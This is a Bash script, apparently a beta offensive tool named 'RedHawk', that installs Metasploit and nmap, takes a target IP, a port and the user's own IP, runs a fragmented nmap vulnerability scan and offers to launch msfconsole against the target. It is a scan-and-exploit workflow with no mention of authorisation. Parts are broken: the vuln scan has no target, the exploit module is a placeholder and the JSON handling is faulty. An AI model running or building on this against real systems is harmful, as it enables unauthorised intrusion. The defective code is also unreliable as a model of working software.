#!/bin/bash

call() {  # plugin call
    local file=$1
    local key=$2
    local commit_call 
    commit_call=$(jq -r ".$key" "$file") 
    echo "$commit_call"
}

foward() {  # plugin foward
    local value=$1
    local file=$2
    jq --arg newValue "$value" ".info = \$newValue" "$file" > tmp.$$.json && mv tmp.$$.json "$file"
    echo "Información enviada: $value"
}


# code

body() { # Body of code


    echo "RedHawk [BETA]" | lolcat
    echo "--------------" | lolcat
    echo ;


}

# Verify MSFCONSOLE

if ! command -v msfconsole > /dev/null 2>&1; then
     sudo apt update -y && sudo apt upgrade -y
       # Installing util dep
    sudo apt install -y curl git-core postgresql libsqlite3-dev -y
       # Installing MTP
    sudo apt install metasploit-framework -y
fi

# Download LOLCAT

echo "TEST" | lolcat > /dev/null 2>&1
if [ $? -ne 0 ]; then
    sudo apt install lolcat -y
else
    sleep 0.5
fi


# Anim OSK

spinner() {
    local delay=0.2
    local frames=("-" "\\" "|" "/")
    "$@" &  
    local pid=$!  
    while kill -0 $pid 2>/dev/null; do
        for frame in "${frames[@]}"; do
            echo -ne "\r$1 $frame"
            sleep $delay
        done
    done
    echo -ne "\r$1... listo!\n"
}

# Validate.

if ! command -v nmap &> /dev/null 2>&1; then
  sudo apt install nmap -y
fi

# database info var

mainsrc="/src"
maindata="database.json"


clear && body

# ask user ip & prt

echo "Enter the ip of target."
read -p "> " iptarget

sleep 0.5 && echo "";
clear && body

echo "Enter protocol."
read -p "> " targetprt
sleep 0.5; echo "";

sleep 0.5 && echo "";
clear && body

echo "Enter your IPv4."
read -p "> " lhost

if [ -f "datausr.json" ]; then
    if jq -e '.LHOST' datausr.json > /dev/null 2>&1; then
        sleep 0.5
    else
        {
            head -n 1 datausr.json
            echo "{\"LHOST\": \"$lhost\"}"
            tail -n +2 datausr.json
        } > tmp.$$.json && mv tmp.$$.json datausr.json
        sleep 0.5
    fi
else
    echo "{\"LHOST\": \"$lhost\"}" > datausr.json
    sleep 0.5
fi


if ping -c 1 -W 1 $iptarget >/dev/null; then
    result=$(sudo nmap -f -T3 -Pn -p "$targetprt" "$iptarget" | grep -E "open|closed|filtered")
    json_output="{"
    while IFS= read -r line; do
        state=$(echo "$line" | awk '{print $2}')
        case $state in
            open)
                json_output+="\"status\": \"Opened\""
                ;;
            closed)
                json_output+="\"status\": \"Closed\""
                ;;
            filtered)
                json_output+="\"status\": \"Filtered\""
                ;;
        esac
    done <<< "$result"
    json_output+="}"
    echo "$json_output" > bridge.json

    # call information.

    drp=$(call "bridge.json" "status" )
     sleep 0.5
     if [ "$drp" != "Opened" ]; then
          clear && echo -n "Sorry, the target "
          echo -n "$iptarget" | lolcat
          echo " no have a opened ports."
      else 
          vulnr=$(sudo nmap --script vuln -Pn -f -T3 -p "$targetprt" | grep -oP 'CVE-\d{4}-\d{4,}')
          if [ $? -ne 0 ]; then
            echo "Error ejecutando nmap. Verifica la configuración de red."
            exit 1
          fi



           echo '{' > vlnt.json

        # Si se encuentran vulnerabilidades:
        if [[ -n "$vulnr" ]]; then
            echo "\"vuln\": [" >> vlnt.json
            for cve in $vulnr; do
                echo "  \"$cve\"," >> vlnt.json
            done
            sed -i '$ s/,$//' vlnt.json  # Eliminar la última coma
            echo "]" >> vlnt.json
            datarel=$(call "vlnt.json" "vuln")
            sleep 0.5; echo -n "The vulnerabilities "
            echo -n "(CVE) " | lolcat
            echo -n "for "
            echo -n "$iptarget " | lolcat
            echo "are: $datarel"
        if [[ -n "$vulnr" ]]; then
            echo "¿Deseas ejecutar Metasploit para explotar las vulnerabilidades encontradas? (s/n)"
            read -p "> " respuesta
              if [[ "$respuesta" == "s" ]]; then
                 msfconsole -x "use exploit/module_name; set RHOST $iptarget; run; exit"
             fi
          fi

        else
            echo "\"vuln\": []" >> vlnt.json
            echo -n "Sorry, "
            echo -n "$iptarget " | lolcat
            echo "the target  has no known vulnerabilities."

        fi


     fi
else
    echo "Host $iptarget no responde. Abortando."
    exit 1
fi